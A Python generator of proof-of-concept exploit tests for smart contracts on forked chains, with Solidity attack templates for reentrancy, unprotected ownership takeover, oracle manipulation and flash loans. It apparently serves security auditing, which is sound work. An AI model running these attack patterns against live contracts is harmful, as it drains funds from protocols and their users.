"""
Concrete Test Templates - No Placeholders, No Slop

These templates generate RUNNABLE tests that prove vulnerabilities.
Every test follows the pattern:
1. SETUP - Real state, real addresses
2. SNAPSHOT - Record before state
3. EXECUTE - Run the exploit
4. ASSERT - Prove the exploit worked with specific assertions
"""

from dataclasses import dataclass
from enum import Enum
from typing import Optional


class TestFramework(Enum):
    FOUNDRY = "foundry"
    HARDHAT = "hardhat"
    ANCHOR = "anchor"
    APTOS = "aptos"
    CAIRO = "cairo"


@dataclass
class TestContext:
    """Context for test generation."""
    target_contract: str
    target_address: str
    vulnerability_type: str
    attacker_address: str = "makeAddr('attacker')"
    victim_address: str = "makeAddr('victim')"
    initial_funds: str = "100 ether"
    block_number: int = 18_500_000
    chain: str = "mainnet"


class ConcreteTestGenerator:
    """Generate concrete, runnable exploit tests."""

    def generate_foundry_test(
        self,
        ctx: TestContext,
        setup_code: str,
        attack_code: str,
        assertions: list[str],
    ) -> str:
        """Generate complete Foundry test."""

        assertion_code = "\n        ".join(assertions)

        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Exploit Test: {ctx.vulnerability_type}
 * @notice Target: {ctx.target_contract}
 *
 * Run: forge test --match-contract {ctx.target_contract}ExploitTest -vvvv --fork-url ${{ETH_RPC}}
 */
contract {ctx.target_contract}ExploitTest is Test {{
    // ============================================================
    // CONSTANTS - Real addresses, no placeholders
    // ============================================================
    address constant TARGET = {ctx.target_address};
    address attacker;
    address victim;

    // State snapshots
    uint256 attackerBalanceBefore;
    uint256 victimBalanceBefore;
    uint256 targetBalanceBefore;

    // ============================================================
    // SETUP
    // ============================================================
    function setUp() public {{
        // Fork at specific block for reproducibility
        vm.createSelectFork("{ctx.chain}", {ctx.block_number});

        // Create test accounts
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        // Label for better traces
        vm.label(TARGET, "{ctx.target_contract}");
        vm.label(attacker, "Attacker");
        vm.label(victim, "Victim");

        // Custom setup
{_indent(setup_code, 8)}
    }}

    // ============================================================
    // EXPLOIT TEST
    // ============================================================
    function test_exploit_{ctx.vulnerability_type.lower().replace(" ", "_")}() public {{
        // ------------------------------------------------------------
        // STEP 1: SNAPSHOT BEFORE
        // ------------------------------------------------------------
        attackerBalanceBefore = attacker.balance;
        victimBalanceBefore = victim.balance;
        targetBalanceBefore = TARGET.balance;

        console.log("========== BEFORE ATTACK ==========");
        console.log("Attacker balance:", attackerBalanceBefore / 1e18, "ETH");
        console.log("Target balance:", targetBalanceBefore / 1e18, "ETH");

        // ------------------------------------------------------------
        // STEP 2: EXECUTE ATTACK
        // ------------------------------------------------------------
        console.log("========== EXECUTING ATTACK ==========");

        vm.startPrank(attacker);
{_indent(attack_code, 8)}
        vm.stopPrank();

        // ------------------------------------------------------------
        // STEP 3: SNAPSHOT AFTER
        // ------------------------------------------------------------
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 targetBalanceAfter = TARGET.balance;

        console.log("========== AFTER ATTACK ==========");
        console.log("Attacker balance:", attackerBalanceAfter / 1e18, "ETH");
        console.log("Target balance:", targetBalanceAfter / 1e18, "ETH");

        // ------------------------------------------------------------
        // STEP 4: PROVE EXPLOIT SUCCESS
        // ------------------------------------------------------------
        console.log("========== ASSERTIONS ==========");

        {assertion_code}

        // Calculate and log profit
        uint256 profit = attackerBalanceAfter > attackerBalanceBefore ?
            attackerBalanceAfter - attackerBalanceBefore : 0;
        console.log("Attacker profit:", profit / 1e18, "ETH");

        console.log("========== EXPLOIT SUCCESSFUL ==========");
    }}
}}
'''

    def generate_hardhat_test(
        self,
        ctx: TestContext,
        setup_code: str,
        attack_code: str,
        assertions: list[str],
    ) -> str:
        """Generate complete Hardhat/ethers.js test."""

        assertion_code = "\n    ".join(assertions)

        return f'''const {{ expect }} = require("chai");
const {{ ethers }} = require("hardhat");

/**
 * Exploit Test: {ctx.vulnerability_type}
 * Target: {ctx.target_contract}
 *
 * Run: npx hardhat test test/{ctx.target_contract}Exploit.test.js --network hardhat
 */
describe("{ctx.target_contract} Exploit", function () {{
    const TARGET_ADDRESS = "{ctx.target_address}";

    let attacker;
    let target;
    let attackerBalanceBefore;
    let targetBalanceBefore;

    before(async function () {{
        // Fork mainnet at specific block
        await network.provider.request({{
            method: "hardhat_reset",
            params: [{{
                forking: {{
                    jsonRpcUrl: process.env.ETH_RPC,
                    blockNumber: {ctx.block_number}
                }}
            }}]
        }});

        [attacker] = await ethers.getSigners();

        // Get target contract
        target = await ethers.getContractAt("{ctx.target_contract}", TARGET_ADDRESS);

        // Custom setup
{_indent(setup_code, 8)}
    }});

    it("should exploit {ctx.vulnerability_type}", async function () {{
        // SNAPSHOT BEFORE
        attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
        targetBalanceBefore = await ethers.provider.getBalance(TARGET_ADDRESS);

        console.log("=== BEFORE ATTACK ===");
        console.log("Attacker:", ethers.formatEther(attackerBalanceBefore), "ETH");
        console.log("Target:", ethers.formatEther(targetBalanceBefore), "ETH");

        // EXECUTE ATTACK
        console.log("=== EXECUTING ATTACK ===");
{_indent(attack_code, 8)}

        // SNAPSHOT AFTER
        const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
        const targetBalanceAfter = await ethers.provider.getBalance(TARGET_ADDRESS);

        console.log("=== AFTER ATTACK ===");
        console.log("Attacker:", ethers.formatEther(attackerBalanceAfter), "ETH");
        console.log("Target:", ethers.formatEther(targetBalanceAfter), "ETH");

        // ASSERTIONS
        {assertion_code}

        const profit = attackerBalanceAfter - attackerBalanceBefore;
        console.log("=== PROFIT:", ethers.formatEther(profit), "ETH ===");
    }});
}});
'''

    def generate_anchor_test(
        self,
        ctx: TestContext,
        setup_code: str,
        attack_code: str,
        assertions: list[str],
    ) -> str:
        """Generate complete Anchor/Solana test."""

        assertion_code = "\n    ".join(assertions)

        return f'''use anchor_lang::prelude::*;
use anchor_lang::solana_program::system_program;
use solana_program_test::*;
use solana_sdk::{{
    signature::{{Keypair, Signer}},
    transaction::Transaction,
    pubkey::Pubkey,
}};

/// Exploit Test: {ctx.vulnerability_type}
/// Target: {ctx.target_contract}
///
/// Run: cargo test test_exploit_{ctx.vulnerability_type.lower().replace(" ", "_")} -- --nocapture

#[tokio::test]
async fn test_exploit_{ctx.vulnerability_type.lower().replace(" ", "_")}() {{
    // ============================================================
    // SETUP
    // ============================================================
    let program_id = Pubkey::new_unique();
    let mut program_test = ProgramTest::new(
        "{ctx.target_contract.lower()}",
        program_id,
        processor!(entry),
    );

    let (mut banks_client, payer, recent_blockhash) = program_test.start().await;

    let attacker = Keypair::new();
    let victim = Keypair::new();

    // Fund accounts
    // ... airdrop SOL ...

    // Custom setup
{_indent(setup_code, 4)}

    // ============================================================
    // SNAPSHOT BEFORE
    // ============================================================
    let attacker_balance_before = banks_client
        .get_balance(attacker.pubkey())
        .await
        .unwrap();

    println!("=== BEFORE ATTACK ===");
    println!("Attacker balance: {{}} SOL", attacker_balance_before as f64 / 1e9);

    // ============================================================
    // EXECUTE ATTACK
    // ============================================================
    println!("=== EXECUTING ATTACK ===");

{_indent(attack_code, 4)}

    // ============================================================
    // SNAPSHOT AFTER
    // ============================================================
    let attacker_balance_after = banks_client
        .get_balance(attacker.pubkey())
        .await
        .unwrap();

    println!("=== AFTER ATTACK ===");
    println!("Attacker balance: {{}} SOL", attacker_balance_after as f64 / 1e9);

    // ============================================================
    // ASSERTIONS
    // ============================================================
    {assertion_code}

    let profit = attacker_balance_after.saturating_sub(attacker_balance_before);
    println!("=== PROFIT: {{}} SOL ===", profit as f64 / 1e9);
}}
'''


def _indent(code: str, spaces: int) -> str:
    """Indent code by specified spaces."""
    indent = " " * spaces
    lines = code.split("\n")
    return "\n".join(indent + line for line in lines)


# Pre-built exploit templates
EXPLOIT_TEMPLATES = {
    "reentrancy": {
        "setup": '''// Fund attacker
vm.deal(attacker, 10 ether);

// Victim deposits funds
vm.deal(victim, 100 ether);
vm.prank(victim);
ITarget(TARGET).deposit{value: 100 ether}();''',

        "attack": '''// Deploy attacker contract
Attacker attackContract = new Attacker(TARGET);

// Fund and execute attack
attackContract.attack{value: 1 ether}();

// Withdraw stolen funds
attackContract.withdraw();''',

        "assertions": [
            'assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker must profit");',
            'assertLt(targetBalanceAfter, targetBalanceBefore, "Target must lose funds");',
            'assertGe(attackerBalanceAfter - attackerBalanceBefore, 1 ether, "Profit must be >= 1 ETH");',
        ]
    },

    "access_control": {
        "setup": '''// Verify attacker is not owner initially
address currentOwner = IOwnable(TARGET).owner();
assertTrue(currentOwner != attacker, "Attacker should not be owner initially");''',

        "attack": '''// Call unprotected admin function
ITarget(TARGET).setOwner(attacker);''',

        "assertions": [
            'assertEq(IOwnable(TARGET).owner(), attacker, "Attacker must become owner");',
        ]
    },

    "oracle_manipulation": {
        "setup": '''// Get initial price
uint256 initialPrice = IOracle(TARGET).getPrice();
console.log("Initial price:", initialPrice);

// Fund attacker for manipulation
vm.deal(attacker, 10000 ether);''',

        "attack": '''// Step 1: Large swap to manipulate price
IWETH(WETH).deposit{value: 5000 ether}();
IWETH(WETH).approve(ROUTER, type(uint256).max);

IRouter(ROUTER).swap(
    WETH,
    TOKEN,
    5000 ether,
    0,  // no slippage for manipulation
    attacker
);

// Step 2: Exploit at manipulated price
ITarget(TARGET).borrow(1000 ether);  // Borrow more than should be allowed

// Step 3: Reverse manipulation
IRouter(ROUTER).swap(TOKEN, WETH, IERC20(TOKEN).balanceOf(attacker), 0, attacker);''',

        "assertions": [
            'assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker must profit from manipulation");',
        ]
    },

    "flash_loan": {
        "setup": '''// Check target has funds to steal
uint256 targetFunds = IERC20(TOKEN).balanceOf(TARGET);
assertGt(targetFunds, 0, "Target must have funds");
console.log("Target funds:", targetFunds);''',

        "attack": '''// Step 1: Flash loan
IFlashLender(LENDER).flashLoan(
    address(this),
    TOKEN,
    1_000_000 ether,  // Borrow 1M tokens
    abi.encode(TARGET)
);

// Callback handles the attack and repayment''',

        "assertions": [
            'assertGt(IERC20(TOKEN).balanceOf(attacker), 0, "Attacker must have tokens");',
        ]
    },
}


def generate_exploit_test(
    vulnerability_type: str,
    target_contract: str,
    target_address: str,
    framework: TestFramework = TestFramework.FOUNDRY,
    custom_setup: Optional[str] = None,
    custom_attack: Optional[str] = None,
    custom_assertions: Optional[list[str]] = None,
) -> str:
    """Generate complete exploit test from template."""

    ctx = TestContext(
        target_contract=target_contract,
        target_address=target_address,
        vulnerability_type=vulnerability_type,
    )

    template = EXPLOIT_TEMPLATES.get(vulnerability_type.lower(), {})

    generator = ConcreteTestGenerator()

    if framework == TestFramework.FOUNDRY:
        return generator.generate_foundry_test(
            ctx,
            custom_setup or template.get("setup", ""),
            custom_attack or template.get("attack", ""),
            custom_assertions or template.get("assertions", []),
        )
    elif framework == TestFramework.HARDHAT:
        return generator.generate_hardhat_test(
            ctx,
            custom_setup or template.get("setup", ""),
            custom_attack or template.get("attack", ""),
            custom_assertions or template.get("assertions", []),
        )
    elif framework == TestFramework.ANCHOR:
        return generator.generate_anchor_test(
            ctx,
            custom_setup or template.get("setup", ""),
            custom_attack or template.get("attack", ""),
            custom_assertions or template.get("assertions", []),
        )

    return ""
